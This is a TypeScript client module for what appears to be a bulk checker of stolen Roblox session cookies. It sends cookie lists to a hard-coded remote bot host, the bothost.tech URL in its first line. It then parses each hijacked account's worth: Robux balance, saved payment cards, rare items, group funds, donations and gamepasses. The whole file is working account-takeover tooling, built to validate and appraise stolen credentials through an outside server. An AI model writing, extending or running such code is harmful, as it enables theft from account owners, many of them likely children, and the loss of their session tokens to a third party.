const DEFAULT_API_URL = 'https://bot-1788812847-5100-s4234sfdsfsdf.bothost.tech/api';

export type AccountCard = {
  brand: string;
  maskedIdentifier: string;
};

export type GameDonation = {
  game: string;
  username?: string;
  amount: number;
  gameId?: number;
  imageUrl?: string;
};

export type PlaytimeEntry = {
  game: string;
  username?: string;
  minutes: number;
  gameId?: number;
  imageUrl?: string;
};

export type GameAssetCheck = {
  game: string;
  gameId: number;
  imageUrl?: string;
  items: Array<{ id: number; name: string }>;
};

export type GameCheckConfig = {
  gameId: number;
  gamepassIds: number[];
  badgeIds: number[];
};

export type OwnedGroup = {
  id: number;
  name: string;
  role?: string;
};

export type CookieCheckAccount = {
  valid: boolean;
  userId?: number;
  username?: string;
  displayName?: string;
  balance?: number | null;
  premium?: boolean | null;
  cards?: number | AccountCard[] | null;
  korblox?: boolean | null;
  hasKorblox?: boolean | null;
  headless?: boolean | null;
  hasHeadless?: boolean | null;
  lastOnline?: string | null;
  badges?: number | null;
  transactions?: number | null;
  collectibles?: number | null;
  online?: boolean | null;
  billing?: number | string | null;
  pending?: number | null;
  gamepasses?: number | null;
  rap?: number | null;
  groupBalance?: number | null;
  ownedGroups?: OwnedGroup[] | null;
  donateYear?: number | null;
  donateAllTime?: number | null;
  age?: number | null;
  ingameDonate?: GameDonation[] | null;
  playtime?: PlaytimeEntry[] | null;
  gamepassesByGame?: GameAssetCheck[] | null;
  badgesByGame?: GameAssetCheck[] | null;
  error?: string;
};

export type CookieCheckResponse = {
  ok: boolean;
  total: number;
  complete: number;
  failed: number;
  elapsed?: string;
  results: CookieCheckAccount[];
};

function apiBaseUrl() {
  const configured = import.meta.env.VITE_RELAY_URL?.trim();
  return (configured || DEFAULT_API_URL).replace(/\/+$/, '');
}

function asNumber(value: unknown) {
  return typeof value === 'number' && Number.isFinite(value) ? value : null;
}

function normalizeCard(value: unknown): AccountCard | null {
  if (!value || typeof value !== 'object') return null;

  const card = value as Record<string, unknown>;
  const brand = typeof card.brand === 'string'
    ? card.brand
    : typeof card.cardBrand === 'string'
      ? card.cardBrand
      : null;
  const maskedIdentifier = typeof card.maskedIdentifier === 'string'
    ? card.maskedIdentifier
    : typeof card.last4 === 'string'
      ? `•••• ${card.last4}`
      : null;

  return brand && maskedIdentifier
    ? { brand, maskedIdentifier }
    : null;
}

function normalizeDonation(value: unknown): GameDonation | null {
  if (!value || typeof value !== 'object') return null;

  const donation = value as Record<string, unknown>;
  const game = typeof donation.game === 'string'
    ? donation.game
    : typeof donation.gameName === 'string'
      ? donation.gameName
      : null;
  const username = typeof donation.username === 'string'
    ? donation.username
    : typeof donation.accountUsername === 'string'
      ? donation.accountUsername
      : typeof donation.donorUsername === 'string'
        ? donation.donorUsername
        : undefined;
  const amount = asNumber(donation.amount ?? donation.robux);

  const gameId = asNumber(donation.gameId);
  const imageUrl = typeof donation.imageUrl === 'string'
    ? donation.imageUrl
    : undefined;

  return game && amount !== null
    ? { game, username, amount, gameId: gameId ?? undefined, imageUrl }
    : null;
}

function normalizePlaytime(value: unknown): PlaytimeEntry | null {
  if (!value || typeof value !== 'object') return null;

  const entry = value as Record<string, unknown>;
  const game = typeof entry.game === 'string'
    ? entry.game
    : typeof entry.gameName === 'string'
      ? entry.gameName
      : null;
  const username = typeof entry.username === 'string'
    ? entry.username
    : typeof entry.accountUsername === 'string'
      ? entry.accountUsername
      : undefined;
  const minutes = asNumber(entry.minutes ?? entry.durationMinutes);
  const gameId = asNumber(entry.gameId);
  const imageUrl = typeof entry.imageUrl === 'string'
    ? entry.imageUrl
    : undefined;

  return game && minutes !== null
    ? { game, username, minutes, gameId: gameId ?? undefined, imageUrl }
    : null;
}

function normalizeOwnedGroup(value: unknown): OwnedGroup | null {
  if (!value || typeof value !== 'object') return null;

  const group = value as Record<string, unknown>;
  const id = asNumber(group.id ?? group.groupId);
  const name = typeof group.name === 'string'
    ? group.name
    : typeof group.groupName === 'string'
      ? group.groupName
      : null;
  const role = typeof group.role === 'string'
    ? group.role
    : typeof group.roleName === 'string'
      ? group.roleName
      : undefined;

  return id !== null && name ? { id, name, role } : null;
}

function normalizeAccount(value: unknown): CookieCheckAccount {
  const account = (
    value && typeof value === 'object' ? value : {}
  ) as Record<string, unknown>;

  const rawCards = Array.isArray(account.cards)
    ? account.cards
        .map(normalizeCard)
        .filter((card): card is AccountCard => Boolean(card))
    : null;

  const rawDonations = Array.isArray(account.ingameDonate)
    ? account.ingameDonate
        .map(normalizeDonation)
        .filter((item): item is GameDonation => Boolean(item))
    : null;

  const rawPlaytime = Array.isArray(account.playtime)
    ? account.playtime
        .map(normalizePlaytime)
        .filter((item): item is PlaytimeEntry => Boolean(item))
    : null;
  const rawGroups = Array.isArray(account.ownedGroups)
    ? account.ownedGroups
        .map(normalizeOwnedGroup)
        .filter((group): group is OwnedGroup => Boolean(group))
    : null;

  return {
    ...account,
    valid: account.valid === true,
    userId: typeof account.userId === 'number'
      ? account.userId
      : undefined,
    username: typeof account.username === 'string'
      ? account.username
      : undefined,
    displayName: typeof account.displayName === 'string'
      ? account.displayName
      : undefined,
    balance: asNumber(account.balance),
    groupBalance: asNumber(account.groupBalance),
    ownedGroups: rawGroups,
    cards: rawCards ?? asNumber(account.cards),
    ingameDonate: rawDonations,
    playtime: rawPlaytime,
  };
}

async function postJson(
  path: string,
  body: unknown,
  signal?: AbortSignal,
) {
  const response = await fetch(`${apiBaseUrl()}${path}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
    signal,
  });

  const payload = await response.json().catch(() => null);

  if (!response.ok) {
    const message = payload && typeof payload.error === 'string'
      ? payload.error
      : `API error ${response.status}`;

    throw new Error(message);
  }

  if (!payload || typeof payload !== 'object') {
    throw new Error('API сервер вернул некорректный ответ.');
  }

  return payload as Record<string, unknown>;
}

function readResults(payload: Record<string, unknown>) {
  const results = Array.isArray(payload.results) ? payload.results : [];

  return results.map(normalizeAccount);
}

function readCount(
  payload: Record<string, unknown>,
  key: string,
  fallback: number,
) {
  return typeof payload[key] === 'number' ? (payload[key] as number) : fallback;
}

export async function checkCookiesViaApi(
  cookies: string[],
  signal?: AbortSignal,
  gameIds: string[] = [],
  gameChecks: GameCheckConfig[] = [],
) {
  const payload = await postJson(
    '/check-full-batch',
    {
      cookies,
      gameIds: gameIds
        .map(Number)
        .filter((id) => Number.isSafeInteger(id) && id > 0),
      gameChecks,
    },
    signal,
  );

  if (!Array.isArray(payload.results)) {
    throw new Error('API сервер вернул ответ без списка результатов.');
  }

  const results = readResults(payload);
  const complete = readCount(
    payload,
    'complete',
    results.filter((account) => account.valid).length,
  );

  return {
    ok: payload.ok !== false,
    total: readCount(payload, 'total', results.length),
    complete,
    failed: readCount(payload, 'failed', results.length - complete),
    elapsed: typeof payload.elapsed === 'string' ? payload.elapsed : undefined,
    results,
  } satisfies CookieCheckResponse;
}

export type ValidateMode = 'validate' | 'refresh';

export type CookieRunResponse = {
  ok: boolean;
  total: number;
  passed: number;
  failed: number;
  elapsed?: string;
  results: CookieCheckAccount[];
};

// Posts to /validate-batch: it costs a single request per cookie.
// /refresh-batch would additionally hit currency, settings, cards and two
// inventory endpoints per cookie, which this view does not display.
async function runCookieCheck(cookies: string[], signal?: AbortSignal) {
  const payload = await postJson('/validate-batch', { cookies }, signal);

  if (!Array.isArray(payload.results)) {
    throw new Error('API сервер вернул ответ без списка результатов.');
  }

  const results = readResults(payload);
  const passed = readCount(
    payload,
    'valid',
    results.filter((account) => account.valid).length,
  );

  return {
    ok: payload.ok !== false,
    total: readCount(payload, 'total', results.length),
    passed,
    failed: readCount(payload, 'invalid', results.length - passed),
    elapsed: typeof payload.elapsed === 'string' ? payload.elapsed : undefined,
    results,
  } satisfies CookieRunResponse;
}

export function validateCookiesViaApi(cookies: string[], signal?: AbortSignal) {
  return runCookieCheck(cookies, signal);
}